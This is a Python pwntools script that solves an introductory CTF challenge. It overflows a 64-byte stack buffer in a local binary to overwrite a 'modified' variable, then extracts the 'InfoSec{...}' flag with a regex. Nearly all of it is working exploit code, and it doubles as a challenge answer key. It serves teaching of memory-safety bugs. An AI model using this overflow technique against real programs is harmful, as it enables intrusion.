#!/usr/bin/env python3
from pwn import *
import re

# Run process
io = process("./demo1")

# 64 (array size) is decimal, 0x64 is hexadecimal (0x64 = 100 in decimal)
array_size = 64

# compiler added 12 bytes of padding between the end of the local "buffer" and the local variable "modified"
pad_size = 12

# the 4 bytes value of modified must not be 0
new_modified = b"zzz\n"

# fill the buffer, fill padding with something, overwrite the value of "modified" with some value != 0
payload = b"x" * array_size + b"?" * pad_size + b"zzz"

# send the payload which gets processed by fgets
io.sendline(payload)

# process output
r = io.recvall().decode("ascii")

flag_regex = re.compile("(InfoSec{.+[^}]})")
flag = flag_regex.findall(r)
flag = flag[0]
print(flag)

# f = open("solution.txt", "w")
# f.write(flag)
# f.close()
